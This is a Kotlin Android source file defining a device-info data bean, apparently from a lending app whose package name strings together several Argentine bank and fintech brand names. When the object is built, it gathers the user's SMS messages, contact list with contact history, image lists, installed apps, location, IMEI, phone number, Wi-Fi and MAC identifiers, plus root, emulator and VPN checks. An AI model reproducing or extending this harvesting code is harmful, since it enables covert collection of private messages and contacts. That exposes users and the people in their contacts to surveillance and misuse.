package com.macro.online.lemoncash.mio.brubank.creditos.personalpay.uala.prestamo.galicia.ui.bean

import android.os.Build
import com.base.devices.data.*
import com.base.devices.utils.*
import com.base.devices.utils.GeneralUtils.getImei
import com.base.devices.utils.OtherUtils.*
import com.base.devices.utils.PhoneUtils.getPhone

class DeviceInfoBean() {
    var hardware: HardwareBean = HardwareBean()
    var storage: StorageBean = StorageBean()
    var other_data: OtherDataBean? = OtherDataBean()
    var application: List<AppListData.AppListInfo> = AppListData.getAppListData(AppListData()).list
    var network: NetWorkData? = if (isNetState() == 1) {
        NetWorkUtils.getNetWorkInfo(NetWorkData())
    } else {
        null
    }
    var location: LocationAddressData = LocationAddressData()
    var battery_status: BatteryStatusData = BatteryStatusData()

    var audio_internal = MediaFilesUtils.getAudioInternal()
    var audio_external = MediaFilesUtils.getAudioExternal()
    var images_internal = MediaFilesUtils.getImagesInternal()
    var images_external = MediaFilesUtils.getImagesExternal()
    var video_internal = MediaFilesUtils.getVideoInternal()
    var video_external = MediaFilesUtils.getVideoExternal()
    var download_files = MediaFilesUtils.getDownloadFilesCount()
    var contact_group = OtherUtils.getContactGroupCount()
    var general_data: GeneralDataBean? = GeneralDataBean()

    var contact: List<ContactData.ContactInfo>? = ContactData.getContactList(ContactData()).list

    var sms: List<SmsDataBean> = mutableListOf<SmsDataBean>().apply {
        MediaFilesUtils.getSms(this)
    }

    //
    var albs: AlbsDataBean = AlbsDataBean()

    class AlbsDataBean {
        var albs: ChildAlbsDataBean = ChildAlbsDataBean()

        class ChildAlbsDataBean {
            var dataList: List<DataListBean> = mutableListOf<DataListBean>().apply {
                MediaFilesUtils.getImage(this)
            }
        }
    }

    class HardwareBean {
        // 设备名称
        var device_name: String? = Build.DEVICE

        // SDK 版本
        var sdk_version: String? = Build.VERSION.SDK_INT.toString()

        // 设备型号
        var model: String? = Build.MODEL

        // 物理尺寸
        var physical_size: String? = OtherUtils.getScreenSizeOfDevice2()

        // 系统版本
        var release: String? = Build.VERSION.RELEASE

        // 设备名牌
        var brand: String? = Build.BRAND

        // 设备序列号
        var serial_number: String? = OtherUtils.getSerialNumbers()

        // 手机出厂时间戳
        var production_date: String? = Build.TIME.toString()

        // 分辨率高
        var device_height: String? = OtherUtils.height()

        // 分辨率宽
        var device_width: String? = OtherUtils.width()

        // 主板
        var board: String? = Build.BOARD
    }

    class StorageBean {
        // 总内存大小
        var ram_total_size: String? = OtherUtils.getTotalMemory().toString()

        // 内存可用大小
        var ram_usable_size: String? = OtherUtils.getAvailMemory().toString()

        // 内存卡大小
        var memory_card_size: String? = OtherUtils.getExternalTotalSize().toString()

        // 内存卡可使用量
        var memory_card_usable_size: String? = (OtherUtils.getExternalTotalSize() - OtherUtils.getExternalAvailableSize()).toString()

        // 内存卡已使用量
        var memory_card_size_use: String? = OtherUtils.getExternalAvailableSize().toString()

        // 总存储大小
        var internal_storage_total: String? = OtherUtils.getInternalTotalSize().toString()

        // 可用存储大小
        var internal_storage_usable: String? = OtherUtils.getInternalAvailableSize().toString()

        // 是否有外置的SD卡（0否，1是）
        var contain_sd: String? = if ((memory_card_size ?: "0").toLong() <= 0) "1" else "0"

        // 是否有内置的SD卡（0否，1是）
        var extra_sd: String? = null
    }

    class GeneralDataBean {
        // google advertising id(google 广告 id)
        var gaid: String? = GeneralUtils.gaid

        // android_id
        var and_id: String? = GeneralUtils.getAndroidID()

        // 指示设备电话类型的常量。 这表示用于传输语音呼
        // 叫的无线电的类型
        var phone_type: String? = GeneralUtils.getPhoneType()

        // mac 地址
        var mac: String? = NetWorkUtils.getMacAddress()

        // 语言环境的三字母缩写
        var locale_iso_3_language: String? = LanguageUtils.getSystemLanguage().isO3Language

        // 此用户显示的语言环境语⾔的名称
        var locale_display_language: String? = LanguageUtils.getSystemLanguage().displayLanguage

        // 此地区的国家/地区的缩写
        var locale_iso_3_country: String? = LanguageUtils.getSystemLanguage().isO3Country

        // 设备号
        var imei: String? = getImei()

        // 手机号
        var phone_number: String? = getPhone()

        // 网络运营商名称
        var network_operator_name: String? = GeneralUtils.getNetworkOperatorName()

        // 网络类型
        var network_type: String? = GeneralUtils.getNetworkType()

        // 时区的 ID
        var time_zone_id: String? = LanguageUtils.getCurrentTimeZone()

        // 语言
        var language: String? = LanguageUtils.getSystemLanguage().language

        // 是否使用代理
        var is_using_proxy_port: String? = getIsWifiProxy().toString()

        // 是否使用vpn
        var is_using_vpn: String? = checkVPN().toString()

        // 是否开启debug调试
        var is_usb_debug: String? = isAppDebug().toString()

        // 开机时间到现在的毫秒数（包括睡眠时间）
        var elapsedRealtime: String? = getBootTime().toString()

        var sensor: List<SensorData.SensorInfo>? = getSensorList(SensorData()).sensor_lists

        // 设备当前时间
        var currentSystemTime: String? = System.currentTimeMillis().toString()

        // 从开机到现在的毫秒数（不包括睡眠时间）
        var uptimeMillis: String? = getBootTime().toString()

    }

    class OtherDataBean {
        // 是否 root
        var root_jailbreak: String? = isAppRoot().toString()

        // 最后一次启动时间
        var last_boot_time: String? = getBootTime().toString()

        // 连接到设备的键盘种类
        var keyboard: String? = checkDeviceHasNavigationBar().toString()

        // 是否为模拟器
        var simulator: String? = isEmulator().toString()

        // 手机的信号强度
        var dbm: String? = getMobileDbm()
    }

    class ApplicationBean {
        // APP 名称
        var app_name: String? = null

        //包名
        var package_name: String? = null

        // 安装时间
        var in_time: String? = null

        // 最后更新时间
        var up_time: String? = null

        // 版本名称
        var version_name: String? = null

        // 版本号
        var version_code: String? = null

        // 是否系统应用
        var app_type: String? = null

        // 应用标签
        var flags: String? = null
    }

    class ContactBean {
        // 姓名
        var contact_display_name: String? = null

        // 手机号
        var number: String? = null

        // 更新时间
        var up_time: String? = null

        // 与联系人最后联系时间
        var last_time_contacted: String? = null

        // 联系次数
        var times_contacted: String? = null

        // 联系人最后编辑时间
        var lastUsedTime: String? = null

        // 通讯录来源（device/sim
        var source: String? = null

        // 手机号分组
        var group: String? = null
    }

    class NetworkBean {
        // IP 地址
        var IP: String? = null

        // wifi 个数
        var wifi_count: String? = null

        // 当前wifi
        var current_wifi: CurrentWifiBean? = null
        var configured_wifi: List<CurrentWifiBean>? = null

        class CurrentWifiBean {
            // 当前的 wifi BSSID
            var bssid: String? = null

            // 当前的 wifi SSID
            var ssid: String? = null

            // 当前的 wifi mac 地址
            var mac: String? = null

            // 当前的 wifi 名称
            var name: String? = null
        }

    }

}